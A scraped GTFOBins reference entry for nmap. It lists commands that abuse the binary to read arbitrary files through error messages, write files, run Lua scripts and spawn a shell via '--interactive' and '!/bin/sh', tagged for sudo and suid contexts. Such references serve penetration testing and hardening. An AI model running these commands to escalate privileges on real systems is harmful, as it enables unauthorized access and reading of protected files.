{"title": "nmap", "source": "gtfobins", "source_label": "GTFOBins", "path": "nmap", "html": "<h1>nmap</h1>\n<h2>File Read</h2>\n<p>The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.</p>\n<pre><code class=\"language-bash\">nmap -iL /path/to/input-file</code></pre>\n<h2>File Write</h2>\n<p>The payload appears inside the regular nmap output.</p>\n<pre><code class=\"language-bash\">nmap -oG=/path/to/output-file DATA</code></pre>\n<h2>Inherit</h2>\n<p>This allows to run Lua code (`...`).</p>\n<pre><code class=\"language-bash\">echo &#x27;...&#x27; &gt;/path/to/temp-file\nnmap --script=/path/to/temp-file</code></pre>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">nmap --interactive\n!/bin/sh</code></pre>", "excerpt": "nmap File Read The file is actually parsed as a list of hosts/networks, lines are leaked through error messages. nmap -iL /path/to/input-file File Write The payload appears inside the regular nmap output. nmap -oG=/path/to/output-file DATA Inherit…", "tags": ["func:file-read", "func:file-write", "func:inherit", "func:shell", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}